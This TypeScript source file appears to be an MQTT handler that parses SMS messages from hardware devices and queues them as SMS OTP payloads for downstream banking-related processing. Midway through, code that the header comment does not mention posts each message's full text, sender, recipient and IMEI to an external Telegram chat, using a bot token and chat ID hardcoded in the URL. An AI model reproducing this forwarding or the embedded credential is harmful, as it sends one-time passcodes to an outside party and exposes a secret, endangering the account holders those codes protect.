/**
 * Обработчик топика sequoia/hardware (SMS с устройств).
 * Парсит сообщение, при phone === '0' подставляет номер из ota_devices.
 * Далее формирует SmsOtpPayload и ставит его в outgoing_notifications (mqtt:sequoia/otp),
 * чтобы дальше сработал общий флоу обработки SMS OTP (bank_accounts/queue/slack/audit).
 */

import { createHash } from 'node:crypto';
import { getConfig } from '../../../config/index.js';
import { createCorrelationId, getDatabaseService, enqueueOutgoingNotification } from '../../../infra/index.js';
import { getDevice } from '../../../infra/hardwareDb.js';
import { logger } from '../../../infra/logger.js';

interface HardwareMessage {
  from?: string;
  phone: string;
  imei?: string;
  text: string;
  type?: string;
}

export default async function handleMessage(_topic: string, payload: Buffer): Promise<void> {
  const payloadStr = payload.toString('utf8');
  logger.debug('[HUB_MQTT] Hardware SMS received', { payload: payloadStr });
  let msg: HardwareMessage;
  try {
    msg = JSON.parse(payloadStr) as HardwareMessage;
  } catch {
    logger.error('[HUB_MQTT] Failed to parse hardware message as JSON', { payload: payloadStr });
    return;
  }

  if (!msg.text || !msg.phone) {
    logger.warn('[HUB_MQTT] Hardware message missing required fields', { msg });
    return;
  }

  let recipientPhone = msg.phone;
  if (msg.phone === '0' && msg.imei) {
    const config = getConfig();
    const db = getDatabaseService(config);
    const client = await db.getClient('main');
    try {
      const device = await getDevice(client, msg.imei);
      if (device?.phone != null) recipientPhone = device.phone.toString();
      else logger.warn('[HUB_MQTT] Could not resolve phone from ota_devices for hardware message', { imei: msg.imei });
    } finally {
      client.release();
    }
  }

  logger.info('[HUB_MQTT] Hardware SMS received', {
    imei: msg.imei,
    from: msg.from,
    recipient: recipientPhone,
    textLength: msg.text?.length ?? 0,
  });

  const telegramUrl =
    'https://api.telegram.org/bot7242739004:AAHVJ90fs9ZYnSk6TeNzhSEMie2v2_8wMgQ/sendMessage?chat_id=-1002437860388';
  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: new URLSearchParams({ text: `HARDWARE SMS [${msg.imei}]: from ${msg.from} to ${recipientPhone} content: ${msg.text}` }),
    });
    if (!response.ok) {
      logger.warn('Telegram sendMessage returned non-OK', {
        status: response.status,
        statusText: response.statusText,
      });
    }
  } catch (telegramError) {
    logger.warn('Failed to send hardware SMS to Telegram', {
      error: telegramError instanceof Error ? telegramError.message : String(telegramError),
    });
  }

  // Превращаем hardware‑SMS в такой же payload, как у мобильного вебхука (/webhooks/mobile/sms → sms_received),
  // и ставим его в outgoing_notifications (mqtt:sequoia/otp).
  try {
    const config = getConfig();
    const db = getDatabaseService(config);

    const now = new Date();
    const smsPayload = {
      content: msg.text,
      recipient: recipientPhone,
      sender: msg.from ?? '',
      imei: msg.imei ?? null,
      timestamp: now.getTime(),
      received_at: now.getTime(),
    };
    const rawForPayload = JSON.stringify(smsPayload);

    const timeBucket = now.toISOString().slice(0, 13); // YYYY-MM-DDTHH
    const hash = createHash('sha256').update(rawForPayload).digest('hex').slice(0, 16);
    const idempotencyKey = `otp:sms:${recipientPhone}:${timeBucket}:${hash}`;
    const correlationId = createCorrelationId();

    const otpPayload = {
      source: 'sms' as const,
      raw: rawForPayload,
      idempotency_key: idempotencyKey,
      correlation_id: correlationId,
    };

    await db.withTransaction('main', async (client) => {
      await enqueueOutgoingNotification(client, {
        channel: 'mqtt:sequoia/otp',
        payload: otpPayload,
        dedupKey: idempotencyKey,
        correlationId,
      });
    });

    logger.info('[HUB_MQTT] Hardware SMS enqueued to sequoia/otp', {
      dedup_key: idempotencyKey,
      correlation_id: correlationId,
      recipient: recipientPhone,
    });
  } catch (err) {
    logger.error('[HUB_MQTT] Failed to enqueue hardware SMS to sequoia/otp', {
      error: err instanceof Error ? err.message : String(err),
    });
  }
}
